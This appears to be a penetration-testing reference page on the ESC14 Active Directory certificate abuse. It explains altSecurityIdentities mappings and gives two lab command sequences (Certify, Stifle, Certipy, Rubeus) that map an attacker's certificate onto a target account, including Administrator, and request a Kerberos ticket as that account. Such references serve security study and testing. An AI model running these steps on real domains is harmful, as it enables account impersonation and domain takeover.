# Active Directory - Certificate ESC14

## ESC14 - altSecurityIdentities

> ESC14 is an Active Directory Certificate Services (ADCS) abuse technique that leverages the altSecurityIdentities attribute to perform explicit certificate mappings. This attribute allows administrators to associate specific certificates with user or computer accounts for authentication purposes. However, if an attacker gains write access to this attribute, they can add a mapping to a certificate they control, effectively impersonating the targeted account.

Domain administrators can manually associate certificates with a user in Active Directory by configuring the altSecurityIdentities attribute of the user object. This attribute supports six different values, categorized into three weak (insecure) mappings and three strong mappings.

In general, a mapping is considered strong if it relies on unique, non-reusable identifiers. Conversely, mappings based on usernames or email addresses are classified as weak, as these identifiers can be easily reused or changed.

| Mapping                | Example                            | Type   | Remarks       |
| ---------------------- | ---------------------------------- | ------ | ------------- |
| X509IssuerSubject      | `X509:<I>IssuerName<S>SubjectName` | Weak   | /             |
| X509SubjectOnly        | `X509:<S>SubjectName`              | Weak   | /             |
| X509RFC822             | `X509:<RFC822>user@contoso.com`    | Weak   | Email Address |
| X509IssuerSerialNumber | `X509:<I>IssuerName<SR>1234567890` | Strong | Recommended   |
| X509SKI                | `X509:<SKI>123456789abcdef`        | Strong | /             |
| X509SHA1PublicKey      | `X509:<SHA1-PUKEY>123456789abcdef` | Strong | /             |

**Requirements**:

* Ability to modify the attribute `altSecurityIdentitites` of an account.

**Exploitation**:

**Technique 1** with [GhostPack/Certify](https://github.com/GhostPack/Certify) and [logangoins/Stifle](https://github.com/logangoins/Stifle)

```ps1
# the certificate requested must be a machine account certificate
Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine

# convert to base64 .pfx format:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export | base64 -w 0

# generate a certificate mapping string and write it to the target objects altSecurityIdentities attribute:
Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd

# request a TGT using PKINIT authentication, effectively impersonating the target user with Rubeus:
Rubeus.exe asktgt /user:target /certificate:MIIMrQI... /password:P@ssw0rd
```

**Technique 2** using [Deloitte-OffSecResearch/Certipy](https://github.com/Deloitte-OffSecResearch/Certipy) and [JonasBK/Add-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1)

```ps1
# request a machine account certificate
addcomputer.py -method LDAPS -computer-name 'ESC13$' -computer-pass 'P@ssw0rd' -dc-host dc.lab.local 'lab.local/kuma'
certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "ESC13$@lab.local" -p 'P@ssw0rd' -template Machine -ca LAB-CA

# extract Serial Number and Issuer, to configure a strong mapping
certutil -Dump -v .\esc13.pfx
Get-X509IssuerSerialNumberFormat -SerialNumber "<serial-number>" -IssuerDistinguishedName "<issuer-cn>"

# add mapping to the Administrator user
Add-AltSecIDMapping -DistinguishedName "CN=Administrator,CN=Users,DC=lab,DC=local" -MappingString "<output-x509-issuer-serial-number>"

# request TGT for Administrator
Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local /show /nowrap
```

## References

* [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - February 28, 2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
* [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
